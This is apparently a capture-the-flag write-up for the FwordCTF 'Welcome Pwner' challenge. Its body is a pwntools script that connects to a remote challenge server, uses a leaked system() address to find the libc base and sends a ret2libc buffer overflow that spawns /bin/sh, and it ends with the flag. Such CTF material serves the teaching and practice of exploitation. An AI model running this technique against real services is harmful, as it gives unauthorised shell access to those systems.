## FwordCTF: Welcome Pwner
##### *tl;dr: nothing, just an exploit script for now, details later*
```python

#: Fword: Welcome Pwner
from pwn import *

#: 
libc = ELF('libc6_2.30-0ubuntu2_i386.so')
#p = process('./molotov')
p = remote('54.210.217.206', 1240)
system_addr = int(p.recvuntil('\n'), 16)
print(p.recvline())

#:
offset = 'A' * 32
print(hex(system_addr))
libc_base = system_addr - libc.symbols['system']

exploit = ''
exploit += offset
exploit += p32(system_addr)
exploit += p32(0xdeadbeef)
exploit += p32(libc_base + libc.search('/bin/sh').next())
p.sendline(exploit)
p.interactive()

#: FwordCTF{good_j0b_pwn3r}
```
